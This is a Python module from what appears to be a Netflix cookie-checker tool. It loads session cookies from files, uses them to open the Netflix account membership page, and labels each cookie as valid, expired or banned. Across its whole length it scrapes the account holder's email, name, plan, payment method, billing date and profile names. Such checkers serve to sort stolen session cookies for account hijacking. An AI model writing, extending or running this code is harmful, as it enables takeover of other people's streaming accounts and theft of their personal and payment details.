"""
Netflix Cookie Checker — membership page HTML parsing
Based on: github.com/harshitkamboj/Netflix-Cookie-Checker
"""
import re
import requests
from .base import parse_cookies, make_result, new_session, rex
from config import TIMEOUT

MEMBERSHIP_URL = "https://www.netflix.com/account/membership"
ACCOUNT_URL    = "https://www.netflix.com/YourAccount"

NF_H = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Cache-Control": "no-cache",
    "Upgrade-Insecure-Requests": "1",
}

SESSION_COOKIES = ("NetflixId", "SecureNetflixId", "nfvdid", "memclid")


def _extract(html: str) -> dict:
    src = html.replace('\\"', '"').replace("&quot;", '"')
    combined = html + "\n" + src
    return {
        "status":       rex(combined, r'membershipStatus\\":\\"([^"]+)', r'"membershipStatus":"([^"]+)"',
                                      r'data-uia="membership-status"[^>]*>([^<]+)'),
        "plan":         rex(combined, r'planName\\":\\"([^"]+)', r'"planName":"([^"]+)"',
                                      r'data-uia="plan-name"[^>]*>([^<]+)',
                                      r'"currentPlan"\s*:\s*\{[^}]*"name"\s*:\s*"([^"]+)"'),
        "email":        rex(combined, r'email\\":\\"([^"@]+@[^"]+)', r'"email":"([^"@]+@[^"]+)"',
                                      r'data-uia="account-email"[^>]*>([^<]+)'),
        "country":      rex(combined, r'countryOfSignup\\":\\"([A-Z]{2})', r'"countryOfSignup":"([A-Z]{2})"',
                                      r'"country":"([A-Z]{2})"'),
        "max_streams":  rex(combined, r'maxStreams\\":\s*(\d+)', r'"maxStreams":\s*(\d+)'),
        "quality":      rex(combined, r'videoQuality\\":\\"([^"]+)', r'"videoQuality":"([^"]+)"',
                                      r'"quality":"([^"]+)"'),
        "next_billing": rex(combined, r'nextBillingDate\\":\\"([^"]+)', r'"nextBillingDate":"([^"]+)"',
                                      r'data-uia="next-billing-date"[^>]*>([^<]+)'),
        "member_since": rex(combined, r'memberSince\\":\\"([^"]+)', r'"memberSince":"([^"]+)"'),
        "payment":      rex(combined, r'paymentMethod\\":\\"([^"]+)', r'"paymentMethod":"([^"]+)"'),
        "extra_members":rex(combined, r'extraMembersEnabled\\":(true|false)',
                                      r'"extraMembersEnabled":(true|false)'),
        "profiles":     re.findall(r'"profileName"\s*:\s*"([^"]+)"', combined)[:5],
        "name":         rex(combined, r'data-uia="account-name"[^>]*>([^<]+)'),
    }


def check(content: str, filename: str) -> dict:
    cookies = parse_cookies(content)
    if not any(cookies.get(k) for k in SESSION_COOKIES):
        return make_result(filename, content, "INVALID",
                           "Missing Netflix session cookie (NetflixId / SecureNetflixId)")

    s = new_session(cookies, NF_H)
    try:
        r = s.get(MEMBERSHIP_URL, timeout=TIMEOUT, allow_redirects=True)
        url = r.url.lower()
        if "login" in url or "signup" in url:
            return make_result(filename, content, "INVALID", "Redirected to login — cookie expired")
        if r.status_code == 403:
            return make_result(filename, content, "BANNED", "403 — Account restricted")
        if r.status_code not in (200, 302):
            return make_result(filename, content, "UNKNOWN", f"HTTP {r.status_code}")

        info = _extract(r.text)
        ms = (info["status"] or "").upper()
        if ms in ("NEVER_MEMBER", "FORMER_MEMBER"):
            return make_result(filename, content, "INVALID",
                               f"Not a member ({ms})", {"membership": ms})

        extra = {}
        if info["email"]:         extra["email"]         = info["email"]
        if info["name"]:          extra["name"]          = info["name"]
        if info["plan"]:          extra["plan"]          = info["plan"]
        if info["country"]:       extra["country"]       = info["country"]
        if info["max_streams"]:   extra["max_streams"]   = info["max_streams"]
        if info["quality"]:       extra["quality"]       = info["quality"]
        if info["next_billing"]:  extra["next_billing"]  = info["next_billing"]
        if info["member_since"]:  extra["member_since"]  = info["member_since"]
        if info["payment"]:       extra["payment"]       = info["payment"]
        if info["profiles"]:      extra["profiles"]      = ", ".join(info["profiles"])
        if info["extra_members"]: extra["extra_members"] = "Yes" if info["extra_members"] == "true" else "No"
        if ms:                    extra["membership"]    = ms

        return make_result(filename, content, "VALID", "Cookie working ✓", extra)

    except requests.exceptions.Timeout:
        return make_result(filename, content, "TIMEOUT", "Request timed out")
    except Exception as e:
        return make_result(filename, content, "ERROR", str(e))
